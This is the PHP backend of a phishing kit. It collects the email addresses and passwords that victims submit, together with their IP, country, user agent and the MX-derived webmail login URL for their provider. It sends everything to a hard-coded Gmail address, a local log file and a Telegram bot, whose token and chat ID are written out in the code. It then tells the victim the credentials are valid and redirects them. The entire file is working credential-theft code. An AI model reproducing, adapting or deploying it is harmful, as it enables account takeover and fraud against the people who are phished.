<?php 
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');

$Receive_email = "juliawittiman@gmail.com";
$redirect = "https://tinyurl.com/22n99jzf";
$telegramBotToken = "1846952933:AAEgp2ulfucRILQNH4ZSk6CAr7cPDJZxCPs"; // Replace with your Telegram bot token
$telegramChatId = "840259816"; // Replace with your Telegram chat ID

$email = trim($_POST['email']);
$password = trim($_POST['password']);

if ($password != null) {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Get country based on IP
    $country = file_get_contents("https://ipapi.co/$ip/country_name/");

    // Extract email domain
    $emailDomain = substr(strrchr($email, "@"), 1); // Extracts the domain from the email

    // Get MX Record
    $mxRecords = dns_get_record($emailDomain, DNS_MX);
    $mxRecordString = "No MX Records Found";
    $webmailL0gin = "Not Available";
    if (!empty($mxRecords)) {
        $mxRecordString = implode(", ", array_column($mxRecords, 'target')); // Concatenates all MX records

        // Mapping logic for known MX records
        $mxDomain = $mxRecords[0]['target']; // Use the first MX record

        // Known mappings for email providers
        $webmailMapping = [
            // Top European email providers
            'mx.yandex.ru' => 'https://mail.yandex.com',
            'mx.mail.ru' => 'https://mail.ru',
            'mx.ukr.net' => 'https://mail.ukr.net',
            'mx.gmx.net' => 'https://mail.gmx.com',
            'mx.orange.fr' => 'https://webmail.orange.fr',
            'mx.protonmail.ch' => 'https://mail.proton.me',
            'mx.web.de' => 'https://web.de',
            'mx.vodafone.it' => 'https://mail.vodafone.it',
            'mx.libero.it' => 'https://mail.libero.it',
            'mx.tiscali.it' => 'https://mail.tiscali.it',

            // Turkish email providers
            'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
            'mx.superonline.net' => 'https://mail.superonline.net',
            'mx.turk.net' => 'https://mail.turk.net',

            // Spanish email providers
            'mx.telefonica.net' => 'https://webmail.telefonica.net',
            'mx.movistar.es' => 'https://correo.movistar.es',

            // Brazilian email providers
            'mx.uol.com.br' => 'https://email.uol.com.br',
            'mx.terra.com.br' => 'https://webmail.terra.com.br',
            'mx.bol.com.br' => 'https://email.bol.com.br',

            // Generic mappings for international providers
            'stackmail.com' => 'https://stackmail.com',
            'ionos.com' => 'https://mail.ionos.com',
            'appsuite.com' => 'https://mail.appsuite.com',
            '1and1.com' => 'https://mail.ionos.com', // 1and1 redirects to IONOS
            'titan.email' => 'https://mail.titan.email',
            'zoho.com' => 'https://mail.zoho.com',
            'zoho.in' => 'https://mail.zoho.in',
            'zoho.eu' => 'https://mail.zoho.eu',
            'hostinger.com' => 'https://mail.hostinger.com',
            'secureserver.net' => 'https://email.godaddy.com',
            'google.com' => 'https://mail.google.com',
            'mxhichina' => 'https://mail.mxhichina.com/alimail/',
            'emailsrvr.com' => 'https://apps.rackspace.com',
            'aruba.it' => 'https://webmail.aruba.it/',
        ];

        // Determine webmail L0gin URL
        if (strpos($mxDomain, 'natrohost.com') !== false) {
            $webmailL0gin = "https://mail." . $emailDomain;
        } else {
            foreach ($webmailMapping as $key => $url) {
                if (strpos($mxDomain, $key) !== false) {
                    $webmailL0gin = $url;
                    break;
                }
            }
        }

        // Default to webmail.domain if no mapping is found
        if ($webmailL0gin === "Not Available") {
            $webmailL0gin = "https://webmail." . $emailDomain;
        }
    }

    // Construct the message
    $message = "------------------------\n";
    $message .= "Page           : General Update\n";
    $message .= "usr            : $email\n";
    $message .= "Ps             : $password\n";
    $message .= "Country        : $country\n";
    $message .= "Timestamp      : " . date("Y-m-d H:i:s") . "\n";
    $message .= "Hostname       : $hostname\n";
    $message .= "Webmail L0gin  : $webmailL0gin\n";
    $message .= "MX Records     : $mxRecordString\n";
    $message .= "----------------------------------\n";
    $message .= "IP             : $ip\n";
    $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent     : $useragent\n";
    $message .= "-----------------------\n";

    // Send the email
    $subject = "Client : $ip";
    mail($Receive_email, $subject, $message);

    // Write to the text file
    $filePath = "juliawittiman.txt";
    if ($fileHandler = fopen($filePath, "a")) {
        fwrite($fileHandler, $message);
        fclose($fileHandler);
    } else {
        error_log("Unable to write to file: $filePath");
    }

    // Send message to Telegram
    $telegramMessage = urlencode($message);
    file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage");

    // Response
    $signal = 'ok';
    $msg = 'Valid Credentials';
} else {
    $signal = 'error_log';
    $msg = 'Invalid Credentials';
}

// JSON response
$data = array(
    'signal' => $signal,
    'msg' => $msg,
);
echo json_encode($data);

// Redirect to 0utlook Live
header("Location: $redirect");
exit();
?>
